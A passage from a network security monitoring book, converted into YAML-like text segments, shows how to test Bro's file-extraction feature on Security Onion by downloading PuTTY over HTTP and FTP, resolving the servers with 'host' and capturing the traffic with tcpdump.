- en: Now that we’ve altered Bro’s *local.bro* policy script, let’s test our new
  prefs: []
  type: TYPE_NORMAL
- en: functionality.
  prefs: []
  type: TYPE_NORMAL
- en: '***Col ecting Traffic to Test Bro***'
  prefs: []
  type: TYPE_NORMAL
- en: When adding new capabilities to Bro and your SO installation, you should
  prefs: []
  type: TYPE_NORMAL
- en: test the changes manually before committing them. Bro allows you to run
  prefs: []
  type: TYPE_NORMAL
- en: policy scripts and other functionality against saved traffic, and we’ll do this
  prefs: []
  type: TYPE_NORMAL
- en: to test its newly configured ability to extract binaries from packets.
  prefs: []
  type: TYPE_NORMAL
- en: To provide the traffic for this test, we will download the Windows SSH
  prefs: []
  type: TYPE_NORMAL
- en: client PuTTY via HTTP and FTP. The PuTTY website ( *http://www.chiark*
  prefs: []
  type: TYPE_NORMAL
- en: '*.greenend.org.uk/~sgtatham/putty/download.html*) provides links for download-'
  prefs: []
  type: TYPE_NORMAL
- en: ing PuTTY via HTTP ( *http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe*)
    and FTP ( *ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/x86/putty*
  prefs: []
  type: TYPE_NORMAL
- en: '*.exe*), giving us ways to test the capabilities we added to Bro. To save the
    traffic for the test, we will determine the IP addresses of the two servers hosting'
  prefs: []
  type: TYPE_NORMAL
- en: '*putty .exe* via HTTP ( *the.earth.li*) and FTP ( *ftp.chiark.greenend.org.uk*),
    as shown in Listing 12-5, using the Linux host command in a terminal window.'
  prefs: []
  type: TYPE_NORMAL
- en: Extending SO **267**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 148](index-302_1.png)'
  prefs: []
  type: TYPE_IMG
- en: $ **host the.earth.li**
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li has address 46.43.34.31u
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li has IPv6 address 2001:41c8:10:b1f:c0ff:ee:15:900d
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li mail is handled by 10 mail.the.earth.li.
  prefs: []
  type: TYPE_NORMAL
- en: $ **host ftp.chiark.greenend.org.uk**
  prefs: []
  type: TYPE_NORMAL
- en: ftp.chiark.greenend.org.uk is an alias for service-name.chiark.greenend.org.
  prefs: []
  type: TYPE_NORMAL
- en: uk.
  prefs: []
  type: TYPE_NORMAL
- en: service-name.chiark.greenend.org.uk has address 212.13.197.229v
  prefs: []
  type: TYPE_NORMAL
- en: service-name.chiark.greenend.org.uk mail is handled by 0 .
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-5: Determining the IP addresses for HTTP and FTP download servers*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we run two instances of Tcpdump: one configured to log traffic'
  prefs: []
  type: TYPE_NORMAL
- en: to and from the HTTP server at 46.43.34.31 u, and another to log traffic to
  prefs: []
  type: TYPE_NORMAL
- en: and from the FTP server at 212.13.197.229 v. Be sure to run the first com-
  prefs: []
  type: TYPE_NORMAL
- en: 'mand in one terminal, for the HTTP traffic:'
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo tcpdump -n -i eth0 -w http-putty.pcap -s 0 host 46.43.34.31**
  prefs: []
  type: TYPE_NORMAL
- en: 'Run the second command in another terminal, for the FTP traffic:'
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo tcpdump -n -i eth0 -w ftp-putty.pcap -s 0 host 212.13.197.229**
  prefs: []
  type: TYPE_NORMAL
